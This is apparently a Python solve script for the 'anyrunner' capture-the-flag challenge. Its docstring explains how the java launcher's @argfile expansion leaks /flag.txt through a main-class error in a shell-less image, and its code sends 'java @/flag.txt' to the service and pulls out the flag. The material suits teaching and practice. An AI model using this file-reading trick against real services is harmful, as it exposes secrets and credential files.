#!/usr/bin/env python3
"""
anyrunner — AlpacaHack Daily 2026-07-30

The service runs any command line via ProcessBuilder, but in a *distroless* Java
runtime image: no shell, no coreutils, not even `cat`. Only `/usr/bin/java` and
java.base are available (jdk.compiler is NOT in the boot layer at runtime).

Trick: the `java` launcher supports @argfiles — `java @FILE` expands FILE's
contents into the command line. Point it at the flag:

    java @/flag.txt

The flag (no spaces) becomes a single token and is interpreted as the main-class
name, so the launcher leaks it back in its error:

    Error: Could not find or load main class Alpaca{...}

Usage: python3 solve.py <host> <port>
"""
import socket, sys, time, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337


def run(cmd: str) -> bytes:
    s = socket.create_connection((HOST, PORT), timeout=25)
    s.settimeout(25)
    out = b""
    try:
        time.sleep(0.3)            # let the "$ " prompt arrive
        s.sendall(cmd.encode() + b"\n")
        while True:
            b = s.recv(4096)
            if not b:
                break
            out += b
    finally:
        s.close()
    return out


if __name__ == "__main__":
    resp = run("java @/flag.txt").decode(errors="replace")
    m = re.search(r"(Alpaca\{[^}]*\})", resp)
    print(m.group(1) if m else resp)
